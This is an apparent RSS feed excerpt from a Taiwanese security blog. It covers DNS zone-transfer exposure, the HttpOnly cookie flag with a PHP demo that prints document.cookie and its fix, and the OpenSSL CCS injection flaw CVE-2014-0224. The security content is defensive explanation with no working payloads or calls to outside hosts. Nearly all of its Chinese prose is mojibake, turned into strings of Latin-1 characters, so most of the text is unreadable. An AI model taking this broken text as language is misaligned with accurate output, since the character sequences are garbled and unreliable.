  &lt;li&gt;æ—æ•²å´æ“Šï¼šå…¥ä¾µè€…å¯è§€å¯Ÿå“ªäº› name server æœ‰é–‹æ”¾ zone transfer æŸ¥è©¢ï¼Œæ¥è‘—å»è’é›†é‚„æœ‰å“ªäº›å…¬å¸ä½¿ç”¨åŒä¸€å° name serverï¼Œå†é€²ä¸€æ­¥æƒç„é‚£äº› domainã€‚é‚£äº› domain ä¹Ÿè¨±ä¸æ˜¯å¤§å…¬å¸ã€ä¸åœ¨ Alexa top 1M å…§ï¼Œä½†ä½ ç„¡æ³•ç¢ºä¿å®ƒæ°¸é ä¸æœƒæ˜¯å…¥ä¾µè€…çš„æ”»æ“Šç›®æ¨™ã€‚&lt;/li&gt;
  &lt;li&gt;çµåˆ 0day é€²è¡Œæ”»æ“Šï¼šç•¶æŸå€‹ç¬¬ä¸‰æ–¹å¥—ä»¶è¢«æ­éœ² 0day å¼±é»æ™‚ï¼Œæ“æœ‰ä¸Šè¿°è³‡æ–™çš„äººå°±å¯ä»¥è¿…é€ŸåŸ·è¡Œå¤§ç¯„åœçš„æ”»æ“Šã€‚ä¾‹å¦‚&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2013-0156/&quot;&gt;é€™å¹¾å¹´æ­£å¤¯çš„ Rails åœ¨å»å¹´è¢«çˆ†å‡ºæœ‰ Remote Code Exection å¼±é» CVE-2013-0156&lt;/a&gt;ï¼Œå…¥ä¾µè€…å¯ç›´æ¥å°æ‰€æœ‰ redmine é€²è¡Œæ”»æ“Šã€‚&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2014-3412/&quot;&gt;Juniper VPN åœ¨ä»Šå¹´ä¹Ÿè¢«æ­éœ² Remote Code Execution å¼±é»&lt;/a&gt;ï¼Œå…¥ä¾µè€…å¯æ‰¾å°‹æ‰€æœ‰ vpn subdomain ä¾†é€²è¡Œå˜—è©¦ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;åœ¨ä¸Šæ¬¡æˆ‘å€‘æèµ·é€™å€‹å¤è€çš„å¼±é»å¾Œï¼Œå·²ç¶“æœ‰éƒ¨åˆ†å°ç£ä¼æ¥­é™¸çºŒå°‡æ­¤å•é¡Œä¿®å¾©ï¼Œä½†è¨±å¤šå°ç£ä¼æ¥­ä»æœ‰æ­¤å•é¡Œè€Œä¸è‡ªçŸ¥ï¼Œä¹Ÿè¨±éé™£å­æˆ‘å€‘ç›´æ¥åšå€‹ Wall of Shame æ¢åˆ—å‡ºå“ªäº›å» å•†æœ‰å•é¡Œæœƒè®“å¤§å®¶æ¯”è¼ƒæœ‰æ„Ÿ :p&lt;/p&gt;

&lt;p&gt;ä¸éä¹Ÿåˆ¥æ€¥è‘—ç¬‘å°ç£ä¼æ¥­ï¼Œè¨±å¤šåœ‹éš›ç´šçš„å¤§ç¶²ç«™åŒæ¨£ä¹Ÿæœ‰æ­¤é¡å•é¡Œã€‚ç”±æ­¤å¯è¦‹è³‡å®‰å•é¡Œä¸åˆ†æ–°èˆŠã€ä¸åˆ†åœ‹å…§å¤–ï¼Œç¸½æ˜¯å®¹æ˜“è¢«å¤§å®¶å¿½ç•¥ï¼Œç­‰åˆ°ä¸çŸ¥ä¸è¦ºè¢«å…¥ä¾µè€…æ…äº†é‡é‡çš„ä¸€åˆ€å¾Œï¼Œæ‰é©šè¦ºé€™è¨±å¤šçš„å°å¼±é»ä¸€æ—¦ä¸²èµ·ä¾†æ˜¯å¤šéº¼çš„å¯æ€•ã€‚ä½ ï¼Œé–‹å§‹æœ‰æ‰€è­¦è¦ºäº†å—ï¼Ÿ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m/</link>
                <guid>https://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m</guid>
                <pubDate>Fri, 13 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HttpOnly - HTTP Headers çš„è³‡å®‰è­°é¡Œ (3)</title>
                <description>&lt;p&gt;ä¸Šæ¬¡æˆ‘å€‘æåˆ°äº† &lt;a href=&quot;https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/&quot;&gt;Content-Security-Pilicy&lt;/a&gt;ï¼Œé€™æ¬¡æˆ‘å€‘ä¾†èŠèŠåŒæ¨£æ˜¯ç‚ºäº†é˜²ç¦¦ XSS è€Œç”Ÿçš„å¦ä¸€å€‹æŠ€è¡“ã€‚&lt;/p&gt;

&lt;h3 id=&quot;httponly-ç°¡ä»‹&quot;&gt;HttpOnly ç°¡ä»‹&lt;/h3&gt;

&lt;p&gt;Cookie çš„æ¦‚å¿µé›–ç„¶æ—©åœ¨ 1994 å¹´å°±ç”± Netscape çš„å·¥ç¨‹å¸« Montulli æå‡ºï¼Œä½†ç•¶æ™‚ä»æœªæœ‰å®Œå–„çš„é˜²è­·æ©Ÿåˆ¶ï¼Œåƒæ˜¯ HttpOnlyã€Secure ç­‰è¦ç¯„éƒ½æ˜¯å¾Œä¾†é™¸çºŒè¢«æå‡ºï¼Œç›´åˆ° 2011 å¹´ 4 æœˆæ‰åœ¨ &lt;a href=&quot;http://tools.ietf.org/html/rfc6265&quot;&gt;RFC 6265&lt;/a&gt; ä¸­æ­£å¼å®šæ¡ˆã€‚è€Œå…¶ä¸­çš„ &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;HttpOnly&lt;/a&gt; æ˜¯å°ˆé–€ç‚ºäº†æŠµç¦¦æ”»æ“Šè€…åˆ©ç”¨ Cross-Site Scripting (XSS) æ‰‹æ³•ä¾†ç›œå–ç”¨æˆ¶èº«ä»½ï¼Œæ­¤é … Cookie é˜²è­·è¨­å®šæ‡‰è©²æ˜¯åœ¨ HTTP Headers ç³»åˆ—æ–‡ä¸­æœ€å»£ç‚ºäººçŸ¥çš„é …ç›®ã€‚&lt;/p&gt;

&lt;h3 id=&quot;httponly-ä¸»è¦ä½œç”¨&quot;&gt;HttpOnly ä¸»è¦ä½œç”¨&lt;/h3&gt;

&lt;p&gt;èªªæ˜ HttpOnly ä¸»è¦ä½œç”¨ä¹‹å‰ï¼Œå…ˆè«‡è«‡ XSS æœ€å¸¸è¦‹çš„åˆ©ç”¨æ–¹å¼ã€‚XSS æ”»æ“Šæ—©åœ¨ 1990 å¹´å°±è¢«ç™¼ç¾ï¼Œæ­¤æ”»æ“Šæ‰‹æ³•æœ€å¸¸è¦‹çš„åˆ©ç”¨æ–¹å¼æ˜¯å­˜å–ä½¿ç”¨è€…çš„ cookie ä¾†ç²å¾—ä¸€äº›æ©Ÿæ•è³‡æ–™ã€‚åƒæ˜¯å­˜å– session cookie å³å¯ç›œç”¨ä½¿ç”¨è€…çš„èº«ä»½ï¼ˆé—œæ–¼ session çš„é‡è¦æ€§ï¼Œå¯ä»¥åƒè€ƒæˆ‘å€‘éƒ¨è½æ ¼çš„å¦ä¸€ç¯‡æ–‡ç«  &lt;a href=&quot;https://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;HTTP Session æ”»æ“Šèˆ‡é˜²è­·&lt;/a&gt;ï¼‰ï¼Œå¦‚æœåœ¨ cookie ä¸­è¨˜éŒ„äº†å…¶ä»–æ©Ÿæ•è³‡è¨Šï¼Œä¹Ÿå¯èƒ½æœƒä¸€ä½µé­ç«Šã€‚å› æ­¤è‹¥èƒ½é˜»æ­¢æ”»æ“Šè€…å­˜å–å¸¶æœ‰æ•æ„Ÿè³‡æ–™çš„ cookieï¼Œå°±èƒ½æ¸›å°‘ XSS å°ä½¿ç”¨è€…çš„å½±éŸ¿ï¼Œå› è€Œå‚¬ç”Ÿäº† HttpOnly æ©Ÿåˆ¶ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;ç•¶ cookie æœ‰è¨­å®š HttpOnly flag æ™‚ï¼Œç€è¦½å™¨æœƒé™åˆ¶ cookie åªèƒ½ç¶“ç”± HTTP(S) å”å®šä¾†å­˜å–ã€‚å› æ­¤ç•¶ç¶²ç«™æœ‰ XSS å¼±é»æ™‚ï¼Œè‹¥ cookie å«æœ‰ HttpOnly flagï¼Œå‰‡æ”»æ“Šè€…ç„¡æ³•ç›´æ¥ç¶“ç”± JavaScript å­˜å–ä½¿ç”¨è€…çš„ session cookieï¼Œå¯é™ä½ä½¿ç”¨è€…èº«ä»½è¢«ç›œç”¨çš„æ©Ÿç‡ã€‚æ—©æœŸæœ‰äº›ç€è¦½å™¨æœªå®Œæ•´å¯¦ä½œ HttpOnly æ‰€æœ‰åŠŸèƒ½ï¼Œå› æ­¤æ”»æ“Šè€…ä»å¯é€é XMLHttpRequest è®€å– cookieï¼Œä½†æœ€è¿‘å¹¾å¹´å„å¤§ç€è¦½å™¨ä¹Ÿé™¸çºŒé˜»æ“‹äº†é€™å€‹æ–¹å¼ã€‚å› æ­¤ HttpOnly å¯æœ‰æ•ˆé™ä½ XSS çš„å½±éŸ¿ä¸¦æå‡æ”»æ“Šé›£åº¦ã€‚ç›®å‰ç€è¦½å™¨çš„æ”¯æ´åˆ—è¡¨å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-browser-support-list.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-browser-support-list.png&quot; alt=&quot;HttpOnly ç€è¦½å™¨æ”¯æ´åˆ—è¡¨&quot; title=&quot;HttpOnly ç€è¦½å™¨æ”¯æ´åˆ—è¡¨&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å…¶ä»–ç€è¦½å™¨æ”¯æ´åˆ—è¡¨ä»¥åŠå„å®¶ç¨‹å¼èªè¨€ä½¿ç”¨ HttpOnly çš„æ–¹å¼å¯åƒè€ƒ &lt;a href=&quot;https://www.owasp.org/index.php/HttpOnly&quot;&gt;OWASP HttpOnly&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h3 id=&quot;httponly-demo&quot;&gt;HttpOnly Demo&lt;/h3&gt;

&lt;p&gt;ä»¥ä¸‹ä½¿ç”¨ PHP ç¨‹å¼ç¢¼ç‚ºä¾‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;HttpOnly Demo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;HttpOnly Demo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;If you didn&apos;t set HttpOnly flag, cookie will write down by document.write().&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-unset.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-unset.png&quot; alt=&quot;æœªè¨­å®š HttpOnly ä¹‹å‰ï¼Œcookie å¯è¢« JavaScript å­˜å–&quot; title=&quot;æœªè¨­å®š HttpOnly ä¹‹å‰ï¼Œcookie å¯è¢« JavaScript å­˜å–&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ä¸Šåœ–ä¸­å¯çœ‹åˆ° PHPSESSID å·²æˆåŠŸè¢« JavaScript å­˜å–ï¼Œé€™ä¹Ÿæ„å‘³è‘—ç¶²ç«™æœ‰ XSS å¼±é»æ™‚ï¼Œä½¿ç”¨è€…çš„èº«ä»½æœ‰è¼ƒé«˜çš„æ©Ÿç‡è¢«ç›œç”¨ã€‚ç‚ºäº†ä½¿ç”¨ HttpOnly é€²è¡Œé˜²è­·ï¼Œè®“æˆ‘å€‘å°‡ PHP ç¨‹å¼ç¢¼ä¿®æ”¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ini_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;session.cookie_httponly&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-set.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-set.png&quot; alt=&quot;è¨­å®š HttpOnly å¾Œï¼Œcookie å·²ç„¡æ³•è¢« JavaScript å­˜å–&quot; title=&quot;è¨­å®š HttpOnly å¾Œï¼Œcookie å·²ç„¡æ³•è¢« JavaScript å­˜å–&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥ä½¿ç”¨ç•«é¢ä¸­å³ä¸Šè§’çš„ Chrome &lt;a href=&quot;https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg&quot;&gt;Edit This Cookie å¥—ä»¶&lt;/a&gt; çœ‹åˆ° HttpOnly å·²ç¶“è¢«å‹¾é¸ï¼ˆå¦‚ç´…æ¡†è™•ï¼‰ï¼Œä¸¦ä¸” PHPSESSID å·²ç„¡æ³•è¢« JavaScript å­˜å–ï¼Œä¸å­˜åœ¨æ–¼ HTML ä¸­ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ç›®å‰ PHP å®˜æ–¹çš„æ•™å­¸æ˜¯ç”¨ session_set_cookie_params é€™å€‹ functionï¼Œå¯åƒè€ƒ&lt;a href=&quot;http://www.php.net/manual/en/function.session-set-cookie-params.php&quot;&gt;å®˜æ–¹ç¶²é çš„é€™ç¯‡èªªæ˜&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;httponly-å¯¦éš›ä½¿ç”¨æ¡ˆä¾‹&quot;&gt;HttpOnly å¯¦éš›ä½¿ç”¨æ¡ˆä¾‹&lt;/h3&gt;

&lt;p&gt;ç”±æ–¼ HttpOnly çš„ä½¿ç”¨æ–¹å¼è¼ƒç°¡å–®ï¼Œå› æ­¤åƒ…åˆ—èˆ‰å¹¾å€‹ç«™å°çš„ä½¿ç”¨çµæœåœ–ç‰‡çµ¦å¤§å®¶åƒè€ƒï¼Œå°±ä¸å¦å¤–å¤šåšèªªæ˜å›‰ï¼&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Tå®¢é‚¦ (www.techbang.com)ï¼Œæœ‰è¨­å®š HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-1.png&quot; alt=&quot;Tå®¢é‚¦&quot; title=&quot;Tå®¢é‚¦&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ„›æ–™ç† (icook.tw)ï¼Œæœ‰è¨­å®š HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-2.png&quot; alt=&quot;æ„›æ–™ç†&quot; title=&quot;æ„›æ–™ç†&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mobile01 (www.mobile01.com)ï¼Œæœªè¨­å®š HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-3.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-3.png&quot; alt=&quot;Mobile01&quot; title=&quot;Mobile01&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Giga Circle (tw.gigacircle.com)ï¼Œæœªè¨­å®š HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-4.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-4.png&quot; alt=&quot;Giga Circle&quot; title=&quot;Giga Circle&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;HttpOnly æ˜¯å­˜åœ¨å·²ä¹…çš„æŠ€è¡“ï¼Œä½†åœ¨æˆ‘å€‘&lt;a href=&quot;https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;ç³»åˆ—æ–‡ç¬¬ä¸€ç¯‡&lt;/a&gt;çš„çµ±è¨ˆç•¶ä¸­ï¼Œæ¡ç”¨çš„æ¯”ä¾‹ä»ç„¶åä½ã€‚å¦‚åŒä¹‹å‰æˆ‘å€‘æåŠçš„ &lt;a href=&quot;http://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transer&lt;/a&gt; å•é¡Œï¼Œå³ä½¿ä¸€é …è³‡å®‰æŠ€è¡“æˆ–è³‡å®‰è­°é¡Œå­˜åœ¨å¾ˆä¹…ï¼Œä¹Ÿéœ€è¦å¤§å®¶æŒçºŒé—œæ³¨ã€‚&lt;/p&gt;

&lt;p&gt;ä½†å³ä½¿æ¡ç”¨äº† HttpOnlyï¼Œä¹Ÿåƒ…èƒ½é˜²æ­¢æƒ¡æ„äººå£«ä¸æ­£ç•¶å­˜å– cookieï¼Œç„¡æ³•é˜²ç¦¦å…¶ä»–çš„ XSS æ”»æ“Šæ–¹å¼ï¼Œä¾‹å¦‚å°‡ä½¿ç”¨è€…å°å‘è‡³é‡£é­šç¶²ç«™é¨™å–å€‹è³‡ã€å°å‘è‡³æƒ¡æ„ç¶²ç«™æ¤å…¥å¾Œé–€ã€ç½®æ›ç¶²é å¤–è§€ç­‰ç­‰ã€‚åŒæ™‚æœªä¾†ä»æœ‰å¯èƒ½å‡ºç¾æ–°çš„ XSS æ”»æ“Šæ‰‹æ³•ï¼Œå› æ­¤åƒè¬åˆ¥å› è¨­å®šäº† HttpOnly å°±æ‰ä»¥è¼•å¿ƒï¼Œèª¤ä»¥ç‚ºä¸æœƒå†è¢« XSS æ‰‹æ³•ä¾µå®³ä¼æ¥­åˆ©ç›Šæˆ–ç”¨æˆ¶è³‡æ–™ï¼Œä»ç„¶å¿…é ˆè¬¹æ…æª¢æŸ¥æ¯ä¸€å€‹ç³»çµ±è¼¸å‡ºè¼¸å…¥é»ï¼Œä»¥é¿å…æœªä¾†å› ä¸Šè¿°å½±éŸ¿å°è‡´ç”¨æˆ¶æˆ–ä¼æ¥­è’™å—æå¤±ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/</link>
                <guid>https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3</guid>
                <pubDate>Wed, 11 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL å†çˆ†åš´é‡æ¼æ´ï¼Œéƒ¨åˆ†é‡è¦ç¶²ç«™ä»åœ¨é¢¨éšªä¸­ï¼</title>
                <description>&lt;p&gt;(æœ¬ç¯‡æœ€å¾Œæ›´æ–°æ™‚é–“ï¼š2014.6.9 15:40 pm)&lt;/p&gt;

&lt;p&gt;OpenSSL åœ˜éšŠæ–¼ 6/5 ä¿®è£œäº†&lt;a href=&quot;http://www.openssl.org/news/secadv_20140605.txt&quot;&gt;å…­é …å®‰å…¨æ¼æ´&lt;/a&gt;ï¼Œ&lt;a href=&quot;http://www.sans.org/about/&quot;&gt;SANS&lt;/a&gt; åœ¨&lt;a href=&quot;https://isc.sans.edu/diary/Critical+OpenSSL+Patch+Available+Patch+Now/18211&quot;&gt;é€™ç¯‡æ–‡ç« &lt;/a&gt;ä¸­æ•´ç†äº†é€™å¹¾å€‹æ¼æ´çš„æ‘˜è¦ï¼Œé€™è£¡æˆªåœ–è¡¨æ ¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140609/openssl_0605_table.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140609/openssl_0605_table.png&quot; alt=&quot;OpenSSL 0605 å®‰å…¨æ›´æ–°æ¯”è¼ƒè¡¨&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å…¶ä¸­ CVE-2014-0224ã€CVE-2014-0195 å…©é …è¢«åˆ—ç‚º Criticalï¼Œæˆ‘å€‘åˆ†åˆ¥ä¾†çœ‹çœ‹é€™å…©å€‹å¼±é»åˆ°åº•é€ æˆäº†ä»€éº¼å±å®³ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;cve-2014-0224-ccs-injection-vulnerability&quot;&gt;CVE-2014-0224 (CCS Injection Vulnerability)&lt;/h3&gt;

&lt;h4 id=&quot;èªªæ˜&quot;&gt;èªªæ˜&lt;/h4&gt;

&lt;p&gt;åŠ å¯†é€šè¨Šè¢«è¦–ç‚ºé é˜²&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB&quot;&gt;ä¸­é–“äººæ”»æ“Š&lt;/a&gt;çš„è§£æ³•ä¹‹ä¸€ï¼Œåˆ©ç”¨ SSL å”å®šé˜²æ­¢ç«Šè½ã€ç«„æ”¹å‚³è¼¸è³‡æ–™æ˜¯ä¸€ç¨®å¸¸è¦‹çš„æ–¹å¼ã€‚ç„¶è€Œ OpenSSL é€™æ¬¡å‡ºç¾åœ¨ ChangeCipherSpecï¼ˆæ›´æ”¹å¯†é‘°è¦æ ¼ï¼‰çš„è¨­è¨ˆç‘•ç–µï¼Œè®“æ”»æ“Šè€…æœ‰è¾¦æ³•è§£å¯†æ‰€æœ‰é€šè¨Šå…§å®¹ï¼Œè®“åŠ å¯†ä¿è­·å¾¹åº•å¤±æ•ˆã€‚&lt;/p&gt;

&lt;p&gt;è©²å¼±é»åŸç†æ˜¯ OpenSSL ä¼ºæœå™¨ç«¯åœ¨å¯¦ä½œ handshake æ™‚ä¸¦æœªæª¢æŸ¥è¨Šæ¯çš„é †åºï¼ˆåš´æ ¼ä¾†èªªæ˜¯ ChangeCipherSpec çš„é †åºï¼‰ï¼Œæ‰€ä»¥æ”»æ“Šè€…å¯ä»¥æå‰é€å‡º ChangeCipherSpec è¨Šæ¯ï¼Œä½¿ä¼ºæœå™¨åœ¨é‚„æœªåˆå§‹å®Œç•¢çš„ç‹€æ…‹å…ˆå»åš ChangeCipherSpec çš„å‹•ä½œï¼Œæœ€çµ‚é€ æˆåŠ è§£å¯†å¯è§£çš„ç‹€æ³ï¼Œæ˜¯ä»¥æ­¤å¼±é»ç¨±ä¹‹ç‚º CCS Injectionã€‚æ›´å¤šçš„ç´°ç¯€è«‹åƒè€ƒåŸé€šå ±è€… Masashi Kikuchi çš„&lt;a href=&quot;http://ccsinjection.lepidum.co.jp/blog/2014-06-05/CCS-Injection-en/index.html&quot;&gt;éƒ¨è½æ ¼&lt;/a&gt;ï¼Œä½ä»¥&lt;a href=&quot;https://www.imperialviolet.org/2014/06/05/earlyccs.html&quot;&gt;é€™ç¯‡&lt;/a&gt;é™„ç¨‹å¼ç¢¼çš„è§£èªªï¼ŒOpenSSL github ä¸Šé—œæ–¼ CVE-2014-0224 çš„ &lt;a href=&quot;https://github.com/openssl/openssl/commit/a91be10833e61bcdc9002de28489405101c52650&quot;&gt;fix&lt;/a&gt; ä¹Ÿå¯ä»¥å¹«åŠ©äº†è§£ã€‚&lt;/p&gt;

&lt;h4 id=&quot;èª°æ‡‰è©²æ³¨æ„&quot;&gt;èª°æ‡‰è©²æ³¨æ„&lt;/h4&gt;

&lt;p&gt;æ‰€æœ‰é  OpenSSL ä¿è­·é€£ç·šçš„æ‡‰ç”¨æœå‹™éƒ½éœ€è¦æ³¨æ„ã€‚åˆå°¤å…¶æ˜¯éŠ€è¡Œã€é‡‘æµæœå‹™é€™äº›é€£ç·šä¸­å­˜åœ¨é‡‘èè³‡è¨Šçš„æœå‹™ï¼Œè‹¥ä¸æ³¨æ„æœƒé€ æˆä¿¡ç”¨å¡å¡è™Ÿæ´©æ¼ï¼Œç¶²è·¯éŠ€è¡Œè¢«ç›œç”¨ã€‚ç¶“éå¯¦éš›æª¢æ¸¬ï¼Œ&lt;strong&gt;ç›®å‰ä»æœ‰éŠ€è¡Œå–®ä½å’Œé‡‘æµå–®ä½ä½¿ç”¨æœ‰å•é¡Œçš„ OpenSSL ç‰ˆæœ¬&lt;/strong&gt;ã€‚æ¶ˆè²»è€…éœ€è¦ç‰¹åˆ¥æ³¨æ„ï¼Œåœ¨ä½¿ç”¨å‰ä¹Ÿå¯é€éä¸‹é¢å°å·¥å…·ä¾†è¼”åŠ©æª¢æŸ¥è‡ªå·±æ‰€ä½¿ç”¨çš„æœå‹™ä½¿å¦å­˜åœ¨é¢¨éšªï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Tripwire æä¾›çš„&lt;a href=&quot;http://www.tripwire.com/state-of-security/incident-detection/detection-script-for-cve-2014-0224-openssl-cipher-change-spec-injection/&quot;&gt;å°ç¨‹å¼&lt;/a&gt; (python)&lt;/li&gt;
  &lt;li&gt;æ¸¬è©¦ç¶²ç«™ &lt;a href=&quot;http://ccsbug.exposed/&quot;&gt;http://ccsbug.exposed/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æ…¶å¹¸çš„æ˜¯ï¼Œæ­¤å¼±é»åªç™¼ç”Ÿåœ¨ç”¨æˆ¶ç«¯åŠä¼ºæœå™¨ç«¯çš†ä½¿ç”¨æœ‰å•é¡Œ OpenSSL ç‰ˆæœ¬çš„ç‹€æ³ä¸‹ã€‚ä¸€èˆ¬ä¾†èªªï¼Œæ¡Œé¢ç«¯çš„ç€è¦½å™¨éƒ½ä¸æ˜¯ä½¿ç”¨ OpenSSLï¼Œæ‰€ä»¥ä¸€èˆ¬ä½¿ç”¨è€…å¯ä»¥ç¨å¾®å®‰å¿ƒã€‚å•é¡Œæ¯”è¼ƒå¤§çš„æ˜¯ android ä½¿ç”¨è€…ï¼Œandroid å…§å»º OpenSSLï¼Œè¨±å¤š app å‘¼å«å®ƒä¾†é€²è¡ŒåŠ å¯†å‚³è¼¸ï¼Œæ‰€ä»¥å»ºè­° android ç”¨æˆ¶åœ¨ google é‡‹å‡ºæ›´æ–°å‰ï¼Œä¸è¦ä½¿ç”¨æ‰‹æ©Ÿé€£ç·šåˆ°æœ‰å•é¡Œçš„æœå‹™ï¼Œæˆ–ä½¿ç”¨è‡ªå¸¶ SSL çš„ appï¼Œä¾‹å¦‚ï¼šfirefoxã€æœ€æ–°ç‰ˆ Chrome (35.0.1916.141)â€¦ã€‚&lt;/p&gt;

